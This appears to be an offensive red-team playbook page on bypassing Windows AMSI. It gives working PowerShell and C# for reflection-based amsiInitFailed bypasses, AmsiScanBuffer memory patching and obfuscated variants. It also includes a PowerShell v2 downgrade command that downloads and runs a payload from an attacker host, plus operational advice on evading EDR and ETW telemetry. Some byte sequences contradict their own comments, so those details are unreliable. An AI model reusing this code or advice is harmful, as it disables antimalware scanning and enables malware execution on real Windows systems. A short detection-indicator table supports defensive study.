# AMSI Bypass Techniques

> **MITRE ATT&CK**: Defense Evasion > T1562.001 - Impair Defenses: Disable or Modify Tools
> **Platforms**: Windows
> **Required Privileges**: User
> **OPSEC Risk**: Medium

## Strategic Overview

The Anti-Malware Scan Interface (AMSI) is a vendor-agnostic interface that allows antimalware products to scan content at runtime. It hooks into PowerShell (v5+), .NET (4.8+), VBScript, JScript, and WMI to inspect scripts and in-memory payloads before execution. For a Red Team Lead, bypassing AMSI is often the first gate in any Windows engagement -- without it, the majority of offensive PowerShell tooling and .NET assemblies will be flagged before they run. AMSI bypass is typically chained with ETW evasion to create a blind spot for post-exploitation.

## Technical Deep-Dive

### Understanding the AMSI Architecture

AMSI operates as a broker between scripting engines and antimalware providers. When PowerShell executes a script block, it calls `AmsiScanBuffer()` in `amsi.dll`, which forwards the content to the registered AV provider. The provider returns a result (clean, suspicious, or malicious), and the scripting engine decides whether to allow execution.

### Memory Patching (Most Common)

**Classic amsiInitFailed bypass** -- forces AMSI to believe initialization failed:

```powershell
# Direct reflection to set amsiInitFailed = true
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**AmsiScanBuffer patching** -- overwrites the function entry point so it returns AMSI_RESULT_CLEAN (0):

```powershell
# Locate AmsiScanBuffer in amsi.dll and patch with bytes that return 0
$Win32 = @"
using System; using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$amsiDll = [Win32]::LoadLibrary("amsi.dll")
$amsiScanBuffer = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($amsiScanBuffer, [uint32]5, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)   # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, $patch.Length)
```

**Rasta Mouse variation** -- patches with `xor eax, eax; ret` for minimal footprint:

```powershell
$patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xE6, 0x80, 0xC3)
```

### PowerShell Downgrade Attack

AMSI is not available in PowerShell v2. If .NET Framework 2.0/3.5 is installed, you can bypass entirely:

```powershell
powershell -version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

Check availability: `reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"`.

### Obfuscation to Bypass AMSI Signatures

AMSI relies on the AV engine's signatures. Obfuscating known-bad strings defeats string-matching:

```powershell
# Variable concatenation
$a = "Ams"; $b = "iUt"; $c = "ils"
[Ref].Assembly.GetType("System.Management.Automation.$a$b$c").GetField("ams"+"iIn"+"itFa"+"iled","NonPublic,Static").SetValue($null,$true)

# Base64 encoded type name
$enc = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
[Ref].Assembly.GetType($enc).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Reflection-Based Bypass

Access internal .NET types to manipulate the AMSI context directly:

```csharp
// C# -- null the amsiContext field so scans are skipped
var amsiContext = typeof(System.Management.Automation.AmsiUtils)
    .GetField("amsiContext", BindingFlags.NonPublic | BindingFlags.Static);
amsiContext.SetValue(null, IntPtr.Zero);
```

### CLR Hooking

Hook the .NET CLR before AMSI initializes by hosting a custom CLR or using profiler-based injection:

```
# Using unmanaged CLR hosting to load assemblies without AMSI registration
# ICLRMetaHost -> ICLRRuntimeInfo -> ICLRRuntimeHost -> ExecuteInDefaultAppDomain
# The assembly loads without triggering AMSI because the scan interface is never initialized
```

### Identifying Trigger Strings

Before deploying, identify exactly which bytes trigger detection:

```powershell
# AmsiTrigger -- finds exact strings that AMSI flags
AmsiTrigger_x64.exe -i payload.ps1 -f 3

# ThreatCheck / DefenderCheck -- binary-level signature identification
ThreatCheck.exe -f payload.exe -e Defender
DefenderCheck.exe payload.exe
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Notes |
|-----------|--------|-------|
| Event ID 1116 | Windows Defender | AMSI flagged malicious content |
| ScriptBlock Logging (4104) | PowerShell | Captures bypass code before AMSI disables |
| ETW AMSI Provider | Microsoft-Antimalware-Scan-Interface | Provider GUID: 2A576B87-09A7-520E-C21A-4942F0271D67 |
| `amsi.dll` integrity | EDR memory scanning | Detects patched AmsiScanBuffer |
| PowerShell v2 usage | Process creation logs | Suspicious downgrade indicates evasion |

### Evasion Guidance

- **Obfuscate the bypass itself** -- the bypass one-liner is itself signatured by AMSI; use novel encodings.
- **Chain with ETW evasion** -- disable ETW before AMSI bypass to prevent telemetry of the bypass attempt.
- **Use compiled languages** -- C# assemblies loaded via reflection, Rust/Nim loaders avoid PowerShell AMSI entirely.
- **Patch once, early** -- perform the bypass at the start of the session and do not repeat.
- **Test against target AV** -- use ThreatCheck/DefenderCheck with the same AV version as the target.

---

## 2025 Techniques

### VEH-Squared (VEH^2) -- Patchless AMSI Bypass

The current gold standard for AMSI evasion (CrowdStrike research, presented at RHC^2 May 2025).
Achieves AMSI bypass without patching any memory -- EDR integrity checks that look for modified
AMSI bytes are completely bypassed.

```
# How VEH^2 works:
# 1. Set a hardware breakpoint (DR register) on AmsiScanBuffer entry point
# 2. Register a Vectored Exception Handler (VEH)
# 3. When AmsiScanBuffer is called, hardware breakpoint triggers exception
# 4. VEH catches the exception
# 5. VEH modifies the return value register to indicate "clean" scan result
# 6. Execution continues -- AMSI reports content as clean

# Why this is significant:
# - ZERO memory modifications (no patched bytes)
# - Passes all memory integrity checks by EDRs
# - No assembly instruction patching, function hooking, or IAT modification
# - Hardware breakpoints are per-thread, not global
```

### 2025 AMSI Bypass Intelligence

Key operational findings from r-tec Cyber Security (2025):

```
# STILL EFFECTIVE:
# - Setting amsiInitFailed = true via reflection (works against signature-based EDRs)
# - VEH^2 patchless bypass (bypasses integrity checks)
# - Custom obfuscation of bypass code

# NOW COUNTERPRODUCTIVE:
# - Public obfuscation tools like Invoke-Obfuscation INCREASE VirusTotal detections
# - Vendors have generic rules detecting obfuscation patterns themselves
# - Using well-known AMSI bypass one-liners triggers AMSI signatures

# OPERATIONAL GUIDANCE:
# - Custom obfuscation or patchless approaches (VEH^2) required
# - Compiled languages (C#, Rust, Nim) avoid PowerShell AMSI entirely
# - Test against target's specific AV, not VirusTotal
```

---

## Cross-References

- [ETW Evasion](etw-evasion.md) -- disable ETW before AMSI bypass for full stealth
- [CLM Bypass](clm-bypass.md) -- AMSI works alongside Constrained Language Mode
- [AV/EDR Evasion](av-edr-evasion.md) -- AMSI is one layer in multi-layer defense
- [Signature Evasion](signature-evasion.md) -- obfuscation techniques apply to AMSI payloads

## References

- AMSI documentation: https://docs.microsoft.com/en-us/windows/win32/amsi/
- Matt Graeber's original AMSI bypass research
- Rasta Mouse AMSI patching: https://rastamouse.me/
- AmsiTrigger: https://github.com/RastaMouse/AmsiTrigger
- AMSI.fail -- automated bypass generation (use cautiously, may be monitored)
- CrowdStrike: Patchless AMSI Bypass (VEH^2): https://www.crowdstrike.com/en-us/blog/crowdstrike-investigates-threat-of-patchless-amsi-bypass-attacks/
- r-tec: Bypass AMSI in 2025: https://www.r-tec.net/r-tec-blog-bypass-amsi-in-2025.html
